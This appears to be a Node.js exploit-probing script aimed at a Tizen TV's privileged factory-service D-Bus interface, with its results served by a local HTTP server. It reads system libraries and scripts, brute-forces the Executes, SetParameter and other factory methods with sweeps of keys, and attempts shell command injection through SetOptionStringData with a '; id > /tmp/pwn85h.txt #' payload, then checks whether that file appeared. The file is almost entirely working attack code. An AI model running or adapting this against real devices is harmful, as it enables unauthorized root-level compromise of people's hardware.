'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8174;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe85h.txt';
var PWN = '/tmp/pwn85h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Read libfactory-interface.so strings
  'try {',
  '  var lb = fs.readFileSync("/usr/lib/libfactory-interface.so");',
  '  r.libfac_size = lb.length;',
  '  var lstrs = [], lrun = 0, lstart = 0;',
  '  for (var i = 0; i < lb.length; i++) {',
  '    var b = lb[i];',
  '    if (b >= 32 && b < 127) { if (lrun === 0) lstart = i; lrun++; }',
  '    else { if (lrun >= 5) lstrs.push(lb.slice(lstart,lstart+lrun).toString("ascii")); lrun = 0; }',
  '  }',
  '  r.libfac_exec = lstrs.filter(function(s){ return s.indexOf("exec")>-1||s.indexOf("shell")>-1||s.indexOf("system")>-1||s.indexOf("cmd")>-1||s.indexOf("popen")>-1||s.indexOf("launch")>-1; }).slice(0,30);',
  '  r.libfac_paths = lstrs.filter(function(s){ return s.charAt(0)==="/"; }).slice(0,30);',
  '  r.libfac_all = lstrs.slice(0,100);',
  '} catch(e) { r.libfac_err = e.message; }',

  // 2. Read kexec_on.sh content
  'try { r.kexec_sh = fs.readFileSync("/usr/bin/kexec_on.sh","utf8").slice(0,500); } catch(e) { r.kexec_sh_err = e.message; }',

  // 3. Check /dev/kfactory permissions and try to read it
  'try {',
  '  var kst = fs.statSync("/dev/kfactory");',
  '  r.dev_kfactory = { mode: kst.mode.toString(8), uid: kst.uid, gid: kst.gid };',
  '} catch(e) { r.dev_kfactory_err = e.message; }',

  // 4. Executes(key, cmd) for valid keys (12-25) with cmd 1..5
  'r.exec_cmd_sweep = {};',
  'var valid_keys = [12,14,15,16,17,18,19,20,21,22,23,24,25];',
  'var cmds = [1,2,3,4,5];',
  'valid_keys.forEach(function(k) {',
  '  cmds.forEach(function(c) {',
  '    var key = "k"+k+"_c"+c;',
  '    try {',
  '      var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(k),String(c)],{timeout:3000});',
  '      var eout = (o.stdout||Buffer.from("")).toString().trim();',
  '      if (eout && eout.indexOf("(1,)") === -1) r.exec_cmd_sweep[key] = eout.slice(0,200);',
  '    } catch(e) {}',
  '  });',
  '});',

  // 5. Check pwn after Executes sweep
  'try { r.pwn1 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  // 6. Wider Executes key scan (50, 100, 200, 500, 1000)
  'r.exec_wide = {};',
  'var wide_keys = [26,27,28,29,30,40,50,100,200,500,1000];',
  'wide_keys.forEach(function(k) {',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(k),"0"],{timeout:3000});',
  '    var eout2 = (o2.stdout||Buffer.from("")).toString().trim();',
  '    if (eout2 && eout2.indexOf("(1,)") === -1) r.exec_wide["k"+k] = eout2.slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 7. SetParameter sweep to find exec-triggering parameter
  'r.setparam = {};',
  'var param_keys = [0,1,2,3,4,5,10,100];',
  'param_keys.forEach(function(k) {',
  '  try {',
  '    var o3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter",String(k),"1"],{timeout:4000});',
  '    r.setparam["k"+k] = { status:o3.status, out:(o3.stdout||Buffer.from("")).toString().trim().slice(0,100) };',
  '  } catch(e) { r.setparam["k"+k] = e.message.slice(0,60); }',
  '});',

  // 8. GetLocalSetStr for keys 0..5
  'r.local_str = {};',
  'for (var ls = 0; ls <= 5; ls++) {',
  '  try {',
  '    var o4 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetLocalSetStr",String(ls)],{timeout:4000});',
  '    r.local_str["k"+ls] = (o4.stdout||Buffer.from("")).toString().trim().slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 9. GetSerialNo - might give us model info
  'try {',
  '  var o5 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetSerialNo"],{timeout:5000});',
  '  r.serial_no = (o5.stdout||Buffer.from("")).toString().trim().slice(0,200);',
  '} catch(e) { r.serial_no_err = e.message.slice(0,60); }',

  // 10. Check libfactory-interface.so path variations
  'var libpaths = ["/usr/lib/libfactory-interface.so","/lib/libfactory-interface.so","/usr/lib/arm-linux-gnueabihf/libfactory-interface.so"];',
  'r.libfac_exists = {};',
  'libpaths.forEach(function(p) {',
  '  try { r.libfac_exists[p] = fs.statSync(p).size; } catch(e) { r.libfac_exists[p] = e.code; }',
  '});',

  // 11. Try SetOptionStringData with other keys (1..5) for injection
  'r.set_opt_keys = {};',
  'var opt_keys = [1,2,3,4,5];',
  'opt_keys.forEach(function(k) {',
  '  try {',
  '    var inject = "; id > ' + PWN + ' #";',
  '    var o6 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData",String(k),inject,String(inject.length)],{timeout:4000});',
  '    r.set_opt_keys["k"+k] = { status:o6.status, out:(o6.stdout||Buffer.from("")).toString().trim().slice(0,100) };',
  '  } catch(e) { r.set_opt_keys["k"+k] = e.message.slice(0,60); }',
  '});',

  // 12. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
